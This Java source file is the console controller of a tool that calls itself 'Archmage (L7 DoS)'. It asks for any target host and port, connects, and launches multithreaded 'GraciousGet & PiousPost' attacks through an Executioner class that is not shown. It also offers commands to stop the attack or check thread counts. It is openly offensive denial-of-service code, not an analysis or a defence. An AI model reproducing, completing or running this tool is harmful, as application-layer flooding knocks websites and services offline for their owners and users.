package m3rlin;

import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

import m3rlin.utils.Logger;

public class Archmage {

	private static final String STOP_ATTACK = "STOP";
	private static final String EXIT_ARCHMAGE = "EXIT";

	Executioner executioner;
	
	private Socket socket;
	private Scanner console;
	private String host;
	private int port;
	
	private static Logger log = new Logger("Archmage");
	
	public void start() {
		try {				
			console = new Scanner(System.in);
			log.console("\n>> Establishing connection to " + host + ":" + port + "...");
			socket = new Socket(host, port);
			log.console("\n>> Connection established...");
			log.console("\n>> Begninning GraciousGet & PiousPost attacks...\n\n");
			executioner = new Executioner(host, port);
			executioner.start();
			while (executioner.isRunning()) {
				if(console.hasNextLine()) {
					String input = console.nextLine();
					if (input != null && input.length() > 0) {
						if (input.equalsIgnoreCase(STOP_ATTACK)) {
							stop();
						} else if (input.equalsIgnoreCase(EXIT_ARCHMAGE)) {
							exit();
						}
					} else {
						log.console("\n   Attack threads: " + executioner.getActiveCount());
						log.console("\nCompleted threads: " + executioner.getCompletedTaskCount());
						log.console("\n    Total threads: " + executioner.getTaskCount() + "\n");
					}
				}
			}
		} catch (UnknownHostException e) {			
			log.console("\n>> Could not locate the host (UnknownHostException)\n");			
		} catch (ConnectException e) {		
			log.console("\n>> Could not connect to the socket address, check the port (ConnectException)\n");			
		} catch (IllegalArgumentException e) {			
			log.console("\n>> Port out of range (IllegalArgumentException)\n");
		} catch (IOException e) {
			log.console("\n>> Error acquiring socket connection (IOException)\n");
		}
		init();
		start();
	}
	
	public void stop() throws IOException {
		log.console("\n>> Stopping attack...");
		executioner.stop();
		socket.close();
		log.console("\n>> Attack stopped...\n");
	}
	
	public void exit() throws IOException {
		stop();
		log.console("\n>> Exiting...");
		System.exit(0);
	}
	
	public void init() {
		console = new Scanner(System.in);
		log.console("\nEnter target (IP or host): ");
		host = console.nextLine();
		try {
			log.console("Enter port (Default: 80): ");
			String portStr = console.nextLine();
			if (portStr == null || portStr.length() == 0) {
				port = 80;
			} else {
				port = Integer.parseInt(portStr);
			}
		} catch (NumberFormatException e) {		
			log.console("\n>> Port numbers can't contain non-numeric characters\n");
			init();
		}		
	}
	
	public static void main(String[] args) {
		log.console("+-------------------+\n");
		log.console("| Archmage (L7 DoS) |\n");
		log.console("+-------------------+\n");
		log.console("\nCommands:\"stop\" - Stops the attack; waits for each scheduled thread to complete");
		log.console("\n          \"exit\" - Performs a stop action, then exits the application");
		log.console("\n          \"[enter]\" - Press enter while attacking to check status (won't affect the attack)\n");
		Archmage archmage;
		archmage = new Archmage();
		archmage.init();
		archmage.start();
	}
}